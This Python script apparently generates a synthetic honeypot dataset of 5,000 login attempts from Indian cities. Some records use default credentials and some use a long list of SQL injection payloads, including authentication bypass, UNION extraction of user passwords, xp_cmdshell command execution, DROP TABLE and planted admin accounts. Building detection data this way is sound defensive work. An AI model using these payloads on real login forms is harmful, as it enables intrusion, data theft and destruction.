import json
import random
import uuid
import datetime

indian_cities = [
    ("Bangalore", "Karnataka", "IN", "12.9716", "77.5946"),
    ("Mumbai", "Maharashtra", "IN", "19.0760", "72.8777"),
    ("Delhi", "Delhi", "IN", "28.7041", "77.1025"),
    ("Chennai", "Tamil Nadu", "IN", "13.0827", "80.2707"),
    ("Hyderabad", "Telangana", "IN", "17.3850", "78.4867"),
    ("Kolkata", "West Bengal", "IN", "22.5726", "88.3639"),
    ("Pune", "Maharashtra", "IN", "18.5204", "73.8567"),
    ("Ahmedabad", "Gujarat", "IN", "23.0225", "72.5714"),
    ("Jaipur", "Rajasthan", "IN", "26.9124", "75.7873"),
    ("Lucknow", "Uttar Pradesh", "IN", "26.8467", "80.9462"),
]

wrong_logins = [
    ("admin", "admin123"),
    ("admin", "password"),
    ("user", "123456"),
    ("test", "test123"),
    ("guest", "guest"),
    ("root", "root"),
    ("anonymous", "anonymous"),
    ("admin1", "admin1"),
    ("testuser", "password1"),
    ("user123", "letmein"),
]
sql_injection_payloads = [
    # Authentication Bypass
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "' OR ''='",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' or 1=1--",
    "' or '1'='1'--",
    "' or 1=1 limit 1 --",
    "' or '' = '",
    "admin'/*",
    "admin' #",
    "admin' --",
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' GROUP BY password HAVING 1=1--",
    " ' ORDER BY 1--",
    " ' ORDER BY 2--",
    " ' ORDER BY 3--",
    " ' GROUP BY password HAVING 1=1--",
    " admin'/*",
    " admin' #",
    "admin' --",

    # Union-Based Attacks
    "' UNION SELECT null, null--",
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT NULL, version()--",
    "' UNION SELECT 1, @@version--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT table_name, column_name FROM information_schema.columns--",
    "' UNION SELECT 1, 2, 3, 4--",

    # Error-Based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT COUNT(*) FROM users) AS int)--",
    "' AND 1=1 ORDER BY 100--",
    "' AND updatexml(1, concat(0x7e, version()), 0)--",
    "' AND extractvalue(1, concat(0x7e, (SELECT database())))--",

    # Boolean-Based Blind
    "' AND 1=1--",
    "' AND 1=0--",
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND EXISTS(SELECT * FROM users)--",
    "' AND NOT EXISTS(SELECT * FROM users)--",
    "' AND ASCII(SUBSTRING(@@version, 1, 1)) = 77--",

    # Time-Based Blind
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SLEEP(5)--",
    "' AND SLEEP(5)--",
    "' AND 1=IF(1=1, SLEEP(5), 0)--",
    "' OR IF(1=1, SLEEP(5), 0)--",
    "'; IF (1=1) WAITFOR DELAY '00:00:10'--",
    "' AND pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",

    # Stack Queries (MSSQL)
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC master..xp_cmdshell 'net user'--",

    # Stacked Queries (MySQL/MariaDB)
    "'; DROP TABLE users;--",
    "'; SELECT * FROM users;--",
    "'; INSERT INTO users VALUES ('attacker', 'pass');--",
    "'; UPDATE users SET role='admin' WHERE username='guest';--",

    # Information Gathering
    "' AND 1=(SELECT COUNT(*) FROM users)--",
    "' AND EXISTS(SELECT * FROM information_schema.tables)--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
    "' AND (SELECT COUNT(*) FROM mysql.user) > 0--",
    "' AND (SELECT table_name FROM information_schema.tables LIMIT 1)--",

    # Bypassing Filters
    "'/**/OR/**/1/**/=/**/1--",
    "' OR 1=1; --",
    "' OR 1=1 LIMIT 1--",
    "' OR 'a'='a'--",
    "' OR 1 GROUP BY CONCAT(username, password) FROM users--",

    # Using Encoded or Escaped Characters
    "%27%20OR%201=1--",  # URL encoded
    "' OR 1=1 %23",
    "\" OR \"\"=\"",
    "';--",
    "'||'1'='1",
    "' + '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT 1,2,3--",
    "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",

    # Nested Queries
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--",
    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') = 97--",

    # Malicious insert/update
    "'; INSERT INTO admin_users (username, password) VALUES ('hacker', 'hack');--",
    "'; UPDATE accounts SET balance = 999999 WHERE user = 'attacker';--",

    # Misc / Advanced
    "' OR 1 IN (SELECT MIN(name) FROM sysobjects WHERE type = 'U' AND name > '.')--",
    "' OR EXISTS (SELECT * FROM users WHERE username LIKE '%admin%')--",
    "' OR NOT EXISTS (SELECT * FROM users WHERE username='nonexistent')--",
    "' OR ASCII(SUBSTR((SELECT database()),1,1)) = 115 --",
    "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin')--",
]
# Special characters used in SQL injection
sql_injection_special_chars = [
    "'", '"', ';', '--', '#', '/*', '*/', '=', '<', '>', '!', '!=', '<>',
    '+', '-', '*', '/', '%', '^', '|', '&', '(', ')', '[', ']', '{', '}',
    '\\', '.', ',', ':', '?', '@', '$', '_', '||'
]
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 11; SM-N770F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
]

# Helper to detect special characters
def contains_special_chars(text):
    return any(char in text for char in sql_injection_special_chars if isinstance(text, str))

# Start creating records
data = []

# 4000 benign login attempts
for _ in range(4000):
    city, state, country, lat, lon = random.choice(indian_cities)
    username, password = random.choice(wrong_logins)
    record = {
        "timestamp": str(datetime.datetime.now() - datetime.timedelta(minutes=random.randint(0, 14400))),
        "token": str(uuid.uuid4()),
        "ip": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        "location": f"{city}, {state}, {country}",
        "latitude": lat,
        "longitude": lon,
        "user_agent": random.choice(user_agents),
        "username": username,
        "password": password,
        "login_success": False,
        "login_attempts": random.randint(1, 7),
        "message": f"{username}:{password}",
        "contains_special_characters": contains_special_chars(username) or contains_special_chars(password)
    }
    data.append(record)

# 1000 SQL injection login attempts
for _ in range(1000):
    city, state, country, lat, lon = random.choice(indian_cities)
    if random.choice([True, False]):
        username = random.choice(sql_injection_payloads)
        password = random.choice(wrong_logins)[1]
    else:
        username = random.choice(wrong_logins)[0]
        password = random.choice(sql_injection_payloads)
    record = {
        "timestamp": str(datetime.datetime.now() - datetime.timedelta(minutes=random.randint(0, 14400))),
        "token": str(uuid.uuid4()),
        "ip": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        "location": f"{city}, {state}, {country}",
        "latitude": lat,
        "longitude": lon,
        "user_agent": random.choice(user_agents),
        "username": username,
        "password": password,
        "login_success": True,
        "login_attempts": random.randint(1, 5),
        "message": f"{username}:{password}",
        "contains_special_characters": contains_special_chars(username) or contains_special_chars(password)
    }
    data.append(record)

# Save to JSON file
with open("large_honeypot_5000.json", "w") as f:
    json.dump(data, f, indent=2)

print("✅ Large dataset with 5,000 records saved as large_honeypot_5000.json")
